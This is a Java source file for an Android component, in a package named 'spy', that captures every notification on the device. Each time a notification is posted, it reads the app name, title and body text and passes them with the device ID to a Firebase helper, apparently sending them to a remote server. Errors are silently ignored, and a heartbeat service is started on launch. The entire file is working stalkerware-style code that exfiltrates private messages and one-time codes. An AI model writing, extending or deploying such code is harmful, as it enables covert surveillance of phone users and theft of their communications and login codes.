package com.nexus.spy;
import android.content.Intent;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.provider.Settings;
public class NotifListener extends NotificationListenerService {
    String deviceId;
    @Override public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        startService(new Intent(this, HeartbeatService.class));
    }
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            String title = String.valueOf(sbn.getNotification().extras.getCharSequence("android.title"));
            String body  = String.valueOf(sbn.getNotification().extras.getCharSequence("android.text"));
            String app = getAppName(pkg);
            FirebaseHelper.pushNotification(deviceId, pkg, app, title, body);
        } catch (Exception e) {}
    }
    String getAppName(String pkg) {
        try { return getPackageManager().getApplicationLabel(getPackageManager().getApplicationInfo(pkg, 0)).toString(); }
        catch (Exception e) { return pkg; }
    }
}
